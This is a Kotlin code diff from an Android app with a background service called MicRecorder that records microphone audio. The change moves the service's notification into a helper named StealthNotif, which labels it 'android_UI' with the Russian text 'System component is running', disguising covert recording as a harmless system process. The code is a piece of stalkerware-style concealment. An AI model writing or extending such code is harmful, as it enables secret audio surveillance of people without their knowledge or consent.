@@ -2,6 +2,7 @@ package com.sp.core.services
 
 import android.app.*
 import android.content.Context
+import com.sp.core.util.StealthNotif
 import android.content.Intent
 import android.media.MediaRecorder
 import android.os.Build
@@ -62,16 +63,7 @@ class MicRecorder : Service() {
     }
 
     private fun buildNotification(): Notification {
-        val chId = "sys_media"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(chId, "Media", NotificationManager.IMPORTANCE_MIN)
-            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
-                .createNotificationChannel(ch)
-        }
-        return NotificationCompat.Builder(this, chId)
-            .setContentTitle("android_UI")
-            .setSmallIcon(android.R.drawable.stat_sys_download)
-            .setPriority(NotificationCompat.PRIORITY_MIN).build()
+        return StealthNotif.build(this, "android_UI", "Системный компонент работает")
     }
     override fun onBind(intent: Intent?): IBinder? = null
 }
